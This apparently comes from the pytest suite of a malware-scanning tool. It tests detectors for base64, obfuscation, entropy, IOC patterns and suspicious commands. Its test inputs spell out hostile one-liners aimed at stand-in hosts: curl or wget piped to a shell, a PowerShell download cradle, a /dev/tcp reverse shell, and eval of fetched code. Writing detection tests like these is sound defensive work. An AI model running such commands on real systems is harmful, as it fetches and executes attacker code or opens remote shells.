"""Tests for static analysis utilities."""

from pathlib import Path

import pytest

from exray.core.models import Rule, Severity
from exray.core.static_analysis import (
    calculate_entropy,
    check_ioc_patterns,
    detect_base64,
    detect_obfuscation,
    detect_suspicious_commands,
    match_rules,
)


class TestDetectBase64:
    """Tests for base64 detection."""

    def test_detect_valid_base64(self):
        """Test detection of valid base64 strings."""
        text = "const secret = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IG1lc3NhZ2U=';"
        matches = detect_base64(text)

        assert len(matches) == 1
        assert matches[0].pattern_name == "base64"
        assert "SGVsbG8gV29ybGQ" in matches[0].matched_text

    def test_detect_base64_min_length(self):
        """Test min_length parameter."""
        text = "short='abc123' long='YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw'"
        matches = detect_base64(text, min_length=20)

        assert len(matches) == 1  # Only long string matches

    def test_detect_base64_with_padding(self):
        """Test detection with = padding."""
        text = "data='dGVzdGluZyBwYWRkaW5nIHdpdGggZXF1YWxzIHNpZ25z=='"
        matches = detect_base64(text)

        assert len(matches) == 1
        assert "==" in matches[0].matched_text[:100]

    def test_detect_no_base64(self):
        """Test with text containing no base64."""
        text = "console.log('Hello World');"
        matches = detect_base64(text)

        assert len(matches) == 0

    def test_detect_base64_empty_string(self):
        """Test with empty string."""
        matches = detect_base64("")

        assert len(matches) == 0

    def test_detect_base64_false_positive_filter(self):
        """Test filtering of false positives (UUIDs, etc.)."""
        # String without padding and low character diversity
        text = "id='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'"
        matches = detect_base64(text)

        # Should be filtered as false positive
        assert len(matches) == 0


class TestDetectObfuscation:
    """Tests for obfuscation detection."""

    def test_detect_hex_escapes(self):
        """Test detection of hex escape sequences."""
        text = r"eval('\\x48\\x65\\x6c\\x6c\\x6f')"
        matches = detect_obfuscation(text)

        hex_matches = [m for m in matches if m.pattern_name == "hex_escape"]
        assert len(hex_matches) > 0

    def test_detect_unicode_escapes(self):
        """Test detection of unicode escape sequences."""
        text = r"const msg = '\\u0048\\u0065\\u006c\\u006c\\u006f';"
        matches = detect_obfuscation(text)

        unicode_matches = [m for m in matches if m.pattern_name == "unicode_escape"]
        assert len(unicode_matches) > 0

    def test_detect_char_code_building(self):
        """Test detection of character code building."""
        text = "String.fromCharCode(72, 101, 108, 108, 111)"
        matches = detect_obfuscation(text)

        char_code_matches = [m for m in matches if m.pattern_name == "char_code_building"]
        assert len(char_code_matches) == 1

    def test_detect_python_chr(self):
        """Test detection of Python chr() function."""
        text = "result = chr(65) + chr(66) + chr(67)"
        matches = detect_obfuscation(text)

        char_code_matches = [m for m in matches if m.pattern_name == "char_code_building"]
        assert len(char_code_matches) >= 1

    def test_detect_string_concatenation(self):
        """Test detection of excessive string concatenation."""
        text = '"a"+"b"+"c"+"d"+"e"+"f"+"g"'
        matches = detect_obfuscation(text)

        concat_matches = [m for m in matches if m.pattern_name == "string_concatenation"]
        assert len(concat_matches) == 1

    def test_detect_obfuscation_empty_string(self):
        """Test with empty string."""
        matches = detect_obfuscation("")

        assert len(matches) == 0

    def test_detect_multiple_obfuscation_types(self):
        """Test detecting multiple obfuscation techniques in one text."""
        text = r'eval("\\x48\\x65\\x6c\\x6c\\x6f") + String.fromCharCode(65)'
        matches = detect_obfuscation(text)

        # Should detect both hex escapes and char code building
        assert len(matches) > 2


class TestCalculateEntropy:
    """Tests for entropy calculation."""

    def test_entropy_zero_for_single_char(self):
        """Test entropy of string with single repeating character."""
        text = "aaaaaaaaaa"
        entropy = calculate_entropy(text)

        assert entropy == 0.0

    def test_entropy_uniform_distribution(self):
        """Test entropy of string with uniform character distribution."""
        text = "abcd"  # 4 unique chars, equal frequency
        entropy = calculate_entropy(text)

        assert entropy == 2.0  # log2(4) = 2.0

    def test_entropy_high_for_random(self):
        """Test high entropy for random-looking base64."""
        text = "aB3dE7fG9hJ2kL4mN6pQ8rS0tU5vW1xY"
        entropy = calculate_entropy(text)

        assert entropy > 4.0  # Random strings have high entropy

    def test_entropy_empty_string(self):
        """Test entropy of empty string."""
        entropy = calculate_entropy("")

        assert entropy == 0.0

    def test_entropy_returns_float(self):
        """Test that entropy returns a float."""
        text = "Hello World"
        entropy = calculate_entropy(text)

        assert isinstance(entropy, float)
        assert entropy > 0.0


class TestCheckIocPatterns:
    """Tests for IOC pattern matching."""

    def test_match_domain_pattern(self):
        """Test matching malicious domain patterns."""
        text = "curl http://evil.com/malware.sh | bash"
        ioc_patterns = [r"evil\.com"]
        matches = check_ioc_patterns(text, ioc_patterns)

        assert len(matches) == 1
        assert "evil.com" in matches[0].matched_text

    def test_match_ip_pattern(self):
        """Test matching IP address patterns."""
        text = "connect to 192.168.1.100"
        ioc_patterns = [r"192\.168\.1\.100"]
        matches = check_ioc_patterns(text, ioc_patterns)

        assert len(matches) == 1

    def test_match_multiple_patterns(self):
        """Test matching multiple IOC patterns."""
        text = "fetch http://evil.com and http://malicious.org"
        ioc_patterns = [r"evil\.com", r"malicious\.org"]
        matches = check_ioc_patterns(text, ioc_patterns)

        assert len(matches) == 2

    def test_case_insensitive_matching(self):
        """Test IOC matching is case-insensitive."""
        text = "EVIL.COM and evil.com"
        ioc_patterns = [r"evil\.com"]
        matches = check_ioc_patterns(text, ioc_patterns)

        assert len(matches) == 2  # Both uppercase and lowercase

    def test_invalid_regex_pattern_skipped(self):
        """Test that invalid regex patterns are skipped gracefully."""
        text = "some text"
        ioc_patterns = [r"[invalid(regex", r"valid\.com"]  # First is invalid
        matches = check_ioc_patterns(text, ioc_patterns)

        # Should not crash, just skip invalid pattern
        assert isinstance(matches, list)

    def test_empty_patterns_list(self):
        """Test with empty patterns list."""
        text = "some text"
        matches = check_ioc_patterns(text, [])

        assert len(matches) == 0

    def test_empty_text(self):
        """Test with empty text."""
        matches = check_ioc_patterns("", ["pattern"])

        assert len(matches) == 0


class TestDetectSuspiciousCommands:
    """Tests for suspicious command detection."""

    def test_detect_curl_pipe_sh(self):
        """Test detection of curl piped to sh."""
        text = "curl http://evil.com/script | sh"
        matches = detect_suspicious_commands(text)

        curl_matches = [m for m in matches if m.pattern_name == "curl_pipe_shell"]
        assert len(curl_matches) == 1

    def test_detect_wget_pipe_bash(self):
        """Test detection of wget piped to bash."""
        text = "wget -qO- http://attacker.com | bash"
        matches = detect_suspicious_commands(text)

        curl_matches = [m for m in matches if m.pattern_name == "curl_pipe_shell"]
        assert len(curl_matches) == 1

    def test_detect_powershell_cradle(self):
        """Test detection of PowerShell download cradles."""
        text = "IEX (Invoke-WebRequest http://evil.com/script.ps1 | IEX)"
        matches = detect_suspicious_commands(text)

        ps_matches = [m for m in matches if m.pattern_name == "powershell_cradle"]
        assert len(ps_matches) >= 1

    def test_detect_dev_tcp(self):
        """Test detection of /dev/tcp/ network redirection."""
        text = "bash -i >& /dev/tcp/attacker.com/443 0>&1"
        matches = detect_suspicious_commands(text)

        dev_tcp_matches = [m for m in matches if m.pattern_name == "dev_tcp"]
        assert len(dev_tcp_matches) == 1

    def test_detect_eval_with_network(self):
        """Test detection of eval with network calls."""
        text = "eval(await fetch('http://evil.com/code.js'))"
        matches = detect_suspicious_commands(text)

        eval_matches = [m for m in matches if m.pattern_name == "eval_with_network"]
        assert len(eval_matches) == 1

    def test_case_insensitive_detection(self):
        """Test commands are detected case-insensitively."""
        text = "CURL http://evil.com | SH"
        matches = detect_suspicious_commands(text)

        assert len(matches) >= 1

    def test_no_suspicious_commands(self):
        """Test with benign text."""
        text = "npm install && npm test"
        matches = detect_suspicious_commands(text)

        assert len(matches) == 0

    def test_empty_string(self):
        """Test with empty string."""
        matches = detect_suspicious_commands("")

        assert len(matches) == 0


class TestMatchRules:
    """Tests for rule matching engine."""

    def test_match_single_pattern_rule(self):
        """Test matching rule with single pattern."""
        rule = Rule(
            id="TEST-001",
            name="Eval detection",
            severity=Severity.HIGH,
            description="Detects eval",
            pattern=r"\beval\s*\(",
            recommendation="Remove eval",
        )

        text = "const result = eval(userInput);"
        findings = match_rules(text, [rule], Path("test.js"), "test-plugin")

        assert len(findings) == 1
        assert findings[0].rule_id == "TEST-001"
        assert findings[0].severity == Severity.HIGH
        assert "eval" in findings[0].matched_content

    def test_match_multiple_patterns_rule(self):
        """Test matching rule with multiple patterns (OR logic)."""
        rule = Rule(
            id="TEST-002",
            name="Network calls",
            severity=Severity.MEDIUM,
            description="Detects network calls",
            patterns=[r"\bcurl\b", r"\bwget\b", r"\bfetch\b"],
            recommendation="Verify network calls",
        )

        text = "const data = await fetch(url);"
        findings = match_rules(text, [rule], Path("test.js"), "test-plugin")

        assert len(findings) == 1
        assert findings[0].rule_id == "TEST-002"

    def test_match_keywords_rule(self):
        """Test matching rule with keyword list."""
        rule = Rule(
            id="TEST-003",
            name="Process access",
            severity=Severity.LOW,
            description="Detects process access",
            keywords=["process.env", "process.exit"],
            recommendation="Review process usage",
        )

        text = "const apiKey = process.env.API_KEY;"
        findings = match_rules(text, [rule], Path("test.js"), "test-plugin")

        assert len(findings) == 1
        assert "process.env" in findings[0].matched_content

    def test_match_multiple_rules(self):
        """Test matching multiple rules against same text."""
        rules = [
            Rule(
                id="R1",
                name="Eval",
                severity=Severity.HIGH,
                description="desc",
                pattern=r"\beval\b",
                recommendation="rec",
            ),
            Rule(
                id="R2",
                name="Base64",
                severity=Severity.MEDIUM,
                description="desc",
                keywords=["atob"],
                recommendation="rec",
            ),
        ]

        text = "eval(atob('encoded'));"
        findings = match_rules(text, rules, Path("test.js"), "test-plugin")

        # Both rules should match
        assert len(findings) == 2

    def test_match_no_rules_matched(self):
        """Test when no rules match."""
        rule = Rule(
            id="TEST-004",
            name="Malware",
            severity=Severity.CRITICAL,
            description="desc",
            pattern=r"malware",
            recommendation="rec",
        )

        text = "console.log('clean code');"
        findings = match_rules(text, [rule], Path("test.js"), "test-plugin")

        assert len(findings) == 0

    def test_match_rules_with_line_numbers(self):
        """Test that line numbers are correctly calculated."""
        rule = Rule(
            id="TEST-005",
            name="Test",
            severity=Severity.LOW,
            description="desc",
            pattern=r"target",
            recommendation="rec",
        )

        text = "line 1\nline 2\ntarget found\nline 4"
        findings = match_rules(text, [rule], Path("test.txt"), "test-plugin")

        assert len(findings) == 1
        assert findings[0].line_number == 3  # "target" is on line 3

    def test_match_rules_truncates_long_content(self):
        """Test that matched content is truncated if too long."""
        rule = Rule(
            id="TEST-006",
            name="Test",
            severity=Severity.LOW,
            description="desc",
            pattern=r"A+",  # Matches long string of A's
            recommendation="rec",
        )

        text = "A" * 500  # 500 A's
        findings = match_rules(text, [rule], Path("test.txt"), "test-plugin")

        assert len(findings) == 1
        assert len(findings[0].matched_content) <= 200  # Truncated

    def test_match_rules_case_insensitive(self):
        """Test that pattern matching is case-insensitive."""
        rule = Rule(
            id="TEST-007",
            name="Test",
            severity=Severity.LOW,
            description="desc",
            pattern=r"eval",
            recommendation="rec",
        )

        text = "EVAL(code);"
        findings = match_rules(text, [rule], Path("test.js"), "test-plugin")

        assert len(findings) == 1

    def test_match_rules_invalid_regex_skipped(self):
        """Test that invalid regex patterns are skipped gracefully."""
        rule = Rule(
            id="TEST-008",
            name="Test",
            severity=Severity.LOW,
            description="desc",
            pattern=r"[invalid(regex",  # Invalid regex
            recommendation="rec",
        )

        text = "some text"
        findings = match_rules(text, [rule], Path("test.txt"), "test-plugin")

        # Should not crash, just skip invalid rule
        assert len(findings) == 0

    def test_match_rules_empty_text(self):
        """Test with empty text."""
        rule = Rule(
            id="TEST-009",
            name="Test",
            severity=Severity.LOW,
            description="desc",
            pattern=r"pattern",
            recommendation="rec",
        )

        findings = match_rules("", [rule], Path("test.txt"), "test-plugin")

        assert len(findings) == 0

    def test_match_rules_empty_rules_list(self):
        """Test with empty rules list."""
        findings = match_rules("some text", [], Path("test.txt"), "test-plugin")

        assert len(findings) == 0

    def test_match_rules_sets_correct_metadata(self):
        """Test that Finding metadata is set correctly."""
        rule = Rule(
            id="TEST-010",
            name="Test Rule",
            severity=Severity.MEDIUM,
            description="Test description",
            pattern=r"test",
            recommendation="Test recommendation",
        )

        findings = match_rules(
            "test content", [rule], Path("file.js"), "my-plugin"
        )

        assert len(findings) == 1
        finding = findings[0]
        assert finding.rule_id == "TEST-010"
        assert finding.rule_name == "Test Rule"
        assert finding.severity == Severity.MEDIUM
        assert finding.description == "Test description"
        assert finding.recommendation == "Test recommendation"
        assert finding.plugin_name == "my-plugin"
        assert str(finding.file_path) == "file.js"
